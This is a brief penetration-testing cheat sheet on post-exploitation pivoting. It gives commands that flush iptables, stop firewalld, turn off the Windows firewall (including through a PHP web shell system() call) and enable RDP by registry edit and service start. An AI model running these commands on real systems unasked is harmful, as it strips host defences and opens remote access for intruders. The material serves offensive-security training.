# Pivoting and network on target


## Tunneling your traffic through another host : https://guide.offsecnewbie.com/network-pen

## Linux: Disable firewall

    systemctl stop firewalld
    iptables -F

## Windows: Disable firewall

    Check firewall state: netsh firewall show state
    Turn off through PHP web shell: system(‘netsh firewall show state’);
    Turn firewall off: netsh advfirewall set allprofiles state off
    netsh firewall set opmode disable


## Enable RDP through the command line
    reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
    if terminal services are disabled: sc config TermService start= "demand"
    net start TermService